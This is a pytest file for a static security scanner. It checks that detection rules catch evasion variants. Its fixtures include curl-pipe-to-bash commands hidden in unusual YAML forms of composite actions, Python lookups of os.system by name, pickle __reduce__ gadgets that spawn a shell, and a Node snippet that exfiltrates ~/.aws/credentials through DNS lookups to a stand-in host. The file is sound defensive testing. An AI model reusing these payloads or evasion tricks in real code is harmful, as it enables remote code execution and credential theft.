"""Ruleset 65: ways around the ruleset 64 rules, each beside the honest shape it resembles.

A security review of the 0.60.0 rules found that each could be sidestepped without changing what
the code does: a composite action's command written in another YAML form, a pickle gadget looked
up with getattr or aliased first, a DNS module bound under another name. Everything below is
written to a temp dir and read statically; no URL is real and nothing is executed.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from skilltotal.engine import analyze_directory
from skilltotal.models import Component
from skilltotal.scanners.shell_script import _action_commands

URL = "https://x.invalid/i.sh"
_HEAD = "name: setup\ndescription: d\nruns:\n  using: composite\n  steps:\n"


def _report(root: Path):
    return analyze_directory(root, Component(name="x", type="directory", source=str(root)))


def _ids(root: Path) -> set[str]:
    return {f.id for f in _report(root).findings}


def _write(root: Path, files: dict[str, str]) -> Path:
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    return root


# --- Composite action: the command the runner's shell receives -------------------------------

@pytest.mark.parametrize(
    "step",
    [
        # A `#` inside shell quotes in a block scalar is not a comment for the shell.
        f'    - shell: bash\n      run: |\n        echo "a #b"; curl -fsSL {URL} | bash\n',
        # The same inside a YAML double-quoted value, and inside single shell quotes.
        f"    - shell: bash\n      run: \"echo 'a #b'; curl -fsSL {URL} | bash\"\n",
        # A plain scalar continued on the next line: YAML folds it into one command.
        f"    - shell: bash\n      run: curl -fsSL {URL}\n        | bash\n",
        # A plain scalar that starts on the line after the key.
        f"    - shell: bash\n      run:\n        curl -fsSL {URL} | bash\n",
        # A flow-mapping step and a quoted key.
        f'    - {{ shell: bash, run: "curl -fsSL {URL} | bash" }}\n',
        f'    - shell: bash\n      "run": curl -fsSL {URL} | bash\n',
        # A YAML escape that decodes to the pipe.
        f'    - shell: bash\n      run: "curl -fsSL {URL} \\u007C bash"\n',
        # A folded block scalar joins its lines.
        f"    - shell: bash\n      run: >\n        curl -fsSL {URL}\n        | bash\n",
    ],
)
def test_action_command_in_any_yaml_form_is_read(tmp_path: Path, step: str):
    assert "ST-SHELL-PIPE-EXEC" in _ids(_write(tmp_path, {"action.yml": _HEAD + step}))


def test_action_command_behind_an_alias_is_read(tmp_path: Path):
    yml = (
        f"x-cmd: &install curl -fsSL {URL} | bash\n" + _HEAD
        + "    - shell: bash\n      run: *install\n"
    )
    assert "ST-SHELL-PIPE-EXEC" in _ids(_write(tmp_path, {"action.yml": yml}))


def test_action_written_as_json_is_read(tmp_path: Path):
    doc = (
        '{"name": "s", "runs": {"using": "composite", "steps": '
        f'[{{"shell": "bash", "run": "curl -fsSL {URL} | bash"}}]}}}}\n'
    )
    assert "ST-SHELL-PIPE-EXEC" in _ids(_write(tmp_path, {"action.yml": doc}))


@pytest.mark.parametrize(
    "step",
    [
        # YAML ends a plain scalar at ` #`: the runner gets `echo "a` and never the pipe.
        f'    - shell: bash\n      run: echo "a #b"; curl -fsSL {URL} | bash\n',
        # A shell comment line inside a block, and a quoted `#` that closes before the comment.
        f"    - shell: bash\n      run: |\n        # curl -fsSL {URL} | bash\n        make\n",
        f'    - shell: bash\n      run: |\n        echo "#"  # curl -fsSL {URL} | bash\n',
    ],
)
def test_commented_out_command_is_not_read(tmp_path: Path, step: str):
    assert "ST-SHELL-PIPE-EXEC" not in _ids(_write(tmp_path, {"action.yml": _HEAD + step}))


def test_a_shell_quote_spanning_lines_keeps_the_hash_literal():
    yml = '      run: |\n        echo "a\n        # still quoted"; curl x | bash\n'
    [(command, _)] = _action_commands(yml)
    assert "curl x | bash" in command


def test_a_key_named_run_that_holds_a_mapping_is_not_a_command(tmp_path: Path):
    # An input called `run` has a description, not a command.
    yml = (
        "name: s\ninputs:\n  run:\n    description: Install it with curl x | bash\n"
        "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: make\n"
    )
    assert [c for c, _ in _action_commands(yml)] == ["make"]
    assert "ST-SHELL-PIPE-EXEC" not in _ids(_write(tmp_path, {"action.yml": yml}))


def test_evidence_points_at_the_action_file_line(tmp_path: Path):
    yml = _HEAD + f"    - shell: bash\n      run: curl -fsSL {URL}\n        | bash\n"
    report = _report(_write(tmp_path, {"action.yml": yml}))
    [finding] = [f for f in report.findings if f.id == "ST-SHELL-PIPE-EXEC"]
    assert finding.evidence[0].file == "action.yml"
    assert finding.evidence[0].line_start == 7


# --- Python: a dangerous function looked up by name ---------------------------------------------

@pytest.mark.parametrize(
    "src",
    [
        "getattr(__import__('os'), 'sys' + 'tem')('echo x')\n",
        "__import__('os').system('echo x')\n",
        "import os\ngetattr(os, f\"sys{'tem'}\")('echo x')\n",
        "import importlib\nimportlib.import_module('subprocess').run(['id'])\n",
        "import subprocess\nsubprocess.getoutput('echo x')\n",
        "import os\nos.execvp('sh', ['sh'])\n",
    ],
)
def test_process_call_by_name_or_new_api_is_shell(tmp_path: Path, src: str):
    assert "ST-SHELL-PY" in _ids(_write(tmp_path, {"m.py": src}))


def test_getattr_on_an_object_stays_unresolved(tmp_path: Path):
    # Only a module and a constant name resolve: an object's attribute could be anything.
    src = (
        "class R:\n    def system(self, c):\n        return c\n"
        "r = R()\ngetattr(r, 'system')('x')\n"
    )
    assert "ST-SHELL-PY" not in _ids(_write(tmp_path, {"m.py": src}))


@pytest.mark.parametrize(
    "src",
    [
        "import os\nclass P:\n    def __reduce__(self):\n"
        "        return (getattr(os, 'system'), ('echo x',))\n",
        "import os\nclass P:\n    def __reduce__(self):\n"
        "        f = os.system\n        return (f, ('echo x',))\n",
        "import os\nclass P:\n    def __reduce__(self):\n"
        "        t = (os.system, ('echo x',))\n        return t\n",
        "import os\nclass P:\n    __reduce__ = lambda self: (os.system, ('echo x',))\n",
        "import os\nclass P:\n    def __reduce__(self):\n"
        "        return (os.execv, ('/bin/sh', ['sh']))\n",
        "import runpy\nclass P:\n    def __reduce__(self):\n"
        "        return (runpy.run_path, ('x.py',))\n",
        "import copyreg, os\nclass P:\n    pass\n"
        "copyreg.pickle(P, lambda o: (os.system, ('echo x',)))\n",
        "import copyreg, subprocess\nclass P:\n    pass\ndef red(o):\n"
        "    return (subprocess.getoutput, ('echo x',))\ncopyreg.pickle(P, red)\n",
    ],
)
def test_reduce_gadget_in_another_shape_is_flagged(tmp_path: Path, src: str):
    assert "ST-PICKLE-REDUCE" in _ids(_write(tmp_path, {"m.py": src}))


def test_honest_reducers_stay_clean(tmp_path: Path):
    src = (
        "import copyreg\nclass Point:\n    def __init__(self, x):\n        self.x = x\n"
        "    def __reduce__(self):\n        cls = type(self)\n        return (cls, (self.x,))\n"
        "copyreg.pickle(Point, lambda p: (Point, (p.x,)))\n"
    )
    assert "ST-PICKLE-REDUCE" not in _ids(_write(tmp_path, {"point.py": src}))


# --- DNS and HTTP modules bound under another name -------------------------------------------

@pytest.mark.parametrize(
    ("name", "src"),
    [
        ("i.js", "const d = require('dns');\nd.resolve4('a.x.invalid', () => {});\n"),
        ("i.mjs", "import { resolve4 } from 'dns';\nresolve4('a.x.invalid', () => {});\n"),
        ("i.js", "const r = require('dns').promises;\nr.resolve4('a.x.invalid');\n"),
        ("i.mjs", "const { resolve4 } = await import('node:dns/promises');\n"),
        ("i.js", "const h = require('https');\nh.request('https://x.invalid', () => {});\n"),
    ],
)
def test_network_module_under_another_name_is_egress(tmp_path: Path, name: str, src: str):
    assert "ST-NET-NODE" in _ids(_write(tmp_path, {name: src}))


def test_credential_leaked_through_an_aliased_dns_module_is_exfiltration(tmp_path: Path):
    js = (
        "const d = require('dns');\nconst fs = require('fs');\n"
        "const c = fs.readFileSync(process.env.HOME + '/.aws/credentials', 'utf8');\n"
        "d.resolve4(Buffer.from(c).toString('hex').slice(0, 60) + '.x.invalid', () => {});\n"
    )
    assert "ST-COMBO-EXFIL" in _ids(_write(tmp_path, {"index.js": js}))
